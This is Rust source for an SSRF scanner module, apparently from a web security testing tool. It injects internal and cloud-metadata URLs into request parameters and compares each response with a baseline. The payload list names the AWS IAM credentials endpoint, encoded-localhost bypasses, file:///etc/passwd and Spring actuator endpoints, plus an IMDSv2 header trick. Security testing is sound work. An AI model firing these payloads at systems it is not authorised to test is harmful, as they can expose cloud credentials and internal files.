use crate::http::HttpClient;
use crate::types::{Finding, Mode, Severity};
use anyhow::Result;
use std::collections::HashMap;

/// SSRF scanner — probes param with internal/metadata URLs; crazy mode adds bypass encodings.
/// FIX.3: Negative-control — only flag if BASELINE response differs from PROBE response.
/// Without baseline, static SPAs (where every request returns same body) generate massive FP.
pub async fn scan(http: &HttpClient, target: &str, params: &[String], mode: Mode) -> Result<Vec<Finding>> {
    let mut out = Vec::new();
    let base = if target.contains('?') { target.to_string() } else { format!("{}/?url=http://example.com", target.trim_end_matches('/')) };

    // FIX.3: Fetch baseline first
    let baseline = http.get(target).await.ok();
    let baseline_status = baseline.as_ref().map(|(st, _, _, _)| *st).unwrap_or(0);
    let baseline_len = baseline.as_ref().map(|(_, _, b, _)| b.len()).unwrap_or(0);

    let mut probes = vec![
        "http://169.254.169.254/latest/meta-data/",      // AWS IMDS
        "http://127.0.0.1:80/",                           // localhost
        "http://localhost/",
        "http://[::1]/",
    ];
    if mode == Mode::Crazy {
        probes.extend(vec![
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "http://0x7f.0.0.1/",                         // hex-encoded localhost
            "http://017700000001/",                       // octal localhost
            "http://127.0.0.1.nip.io/",
            "file:///etc/passwd",
            "dict://127.0.0.1:11211/",
            "http://169.254.169.254/latest/meta-data/",    // IMDSv2 base
            "http://localhost/actuator/mappings",           // Spring actuator (research r3)
            "http://127.0.0.1:8080/actuator/env",
        ]);
    }

    // CVE-2025-64709: SSRF IMDSv2 bypass via header injection (Typebot)
    let imdsv2_headers = HashMap::from([
        ("X-aws-ec2-metadata-token-ttl-seconds".to_string(), "21600".to_string()),
    ]);

    for p in params {
        for pr in &probes {
            let u = inject(&base, p, pr);
            if let Ok((st, _h, body, _f)) = http.get(&u).await {
                let lb = body.to_lowercase();
                // FIX.3: Skip if probe response matches baseline (static SPA — FP)
                if st == baseline_status && body.len() == baseline_len {
                    continue;
                }
                if lb.contains("root:") || lb.contains("security-credentials")
                   || lb.contains("instance-id") || st == 200 && lb.contains("ami-") {
                    out.push(
                        Finding::new(Severity::Critical, "SSRF", "Possible SSRF to cloud/internal metadata", target)
                            .with_param(p)
                            .with_payload(pr)
                            .with_evidence("metadata/internal content leaked in response")
                            .with_confidence(95),
                    );
                } else if lb.contains("connection refused") || lb.contains("timeout") {
                    out.push(
                        Finding::new(Severity::Low, "SSRF", "Internal host probed (blind candidate)", target)
                            .with_param(p)
                            .with_payload(pr)
                            .with_note("error disclosure suggests server fetched the URL")
                            .with_confidence(40),
                    );
                } else if st != baseline_status {
                    // FIX.3: status changed → probe affected response (real SSRF candidate)
                    out.push(
                        Finding::new(Severity::Medium, "SSRF", "Probe changed response status (potential SSRF)", target)
                            .with_param(p)
                            .with_payload(pr)
                            .with_evidence(&format!("baseline={} probe={}", baseline_status, st))
                            .with_confidence(60),
                    );
                }
            }
        }
        // CVE-2025-64709: IMDSv2 token header trick
        let u2 = inject(&base, p, "http://169.254.169.254/latest/meta-data/iam/security-credentials/");
        if let Ok((_st2, _h2, b2, _f2)) = http.fetch(&u2, reqwest::Method::GET, None, Some(imdsv2_headers.clone())).await {
            let lb2 = b2.to_lowercase();
            // Only flag if response differs from baseline
            if b2.len() != baseline_len && (lb2.contains("security-credentials") || lb2.contains("\"code\"") || lb2.contains("iam/") || lb2.contains("latest/")) {
                out.push(
                    Finding::new(Severity::Critical, "SSRF", "IMDSv2 token header bypass (CVE-2025-64709)", target)
                        .with_param(p)
                        .with_payload("X-aws-ec2-metadata-token-ttl-seconds:21600")
                        .with_evidence("metadata endpoint reachable via header injection")
                        .with_confidence(85),
                );
            }
        }
    }
    let _ = HashMap::<String, String>::new(); // keep import used
    Ok(out)
}

fn inject(base: &str, key: &str, val: &str) -> String {
    if let Ok(mut u) = url::Url::parse(base) {
        u.query_pairs_mut().append_pair(key, val);
        u.to_string()
    } else {
        format!("{}?{}={}", base, key, val)
    }
}
